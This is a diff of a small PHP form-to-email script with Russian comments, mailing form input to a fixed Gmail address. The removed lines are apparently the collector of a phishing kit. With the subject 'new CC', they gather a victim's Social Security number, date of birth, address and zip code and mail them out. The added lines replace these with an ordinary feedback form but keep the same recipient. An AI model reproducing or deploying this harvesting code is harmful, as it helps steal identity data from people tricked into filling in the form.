@@ -1,10 +1,10 @@
- <?php
+<?php
 $to = "poorfood63@gmail.com"; // емайл получателя данных из формы 
-$tema = "new CC"; // тема полученного емайла 
-$message = "ssn: ".$_POST['ssn']."<br>";//присвоить переменной значение, полученное из формы name=name
-  $message .= "dob: ".$_POST['dob']."<br>"; //полученное из формы name=email
-$message .= "address: ".$_POST['address']."<br>"; //полученное из формы name=phone
-$message .= "zipcode: ".$_POST['zipcode']."<br>"; //полученное из формы name=message
+$tema = "Форма обратной связи на PHP"; // тема полученного емайла 
+$message = "Ваше имя: ".$_POST['name']."<br>";//присвоить переменной значение, полученное из формы name=name
+  $message .= "E-mail: ".$_POST['email']."<br>"; //полученное из формы name=email
+$message .= "Номер телефона: ".$_POST['phone']."<br>"; //полученное из формы name=phone
+$message .= "Сообщение: ".$_POST['message']."<br>"; //полученное из формы name=message
 $headers  = 'MIME-Version: 1.0' . "\r\n"; // заголовок соответствует формату плюс символ перевода строки
   $headers .= 'Content-type: text/html; charset=utf-8' . "\r\n"; // указывает на тип посылаемого контента
 mail($to, $tema, $message, $headers); //отправляет получателю на емайл значения переменных
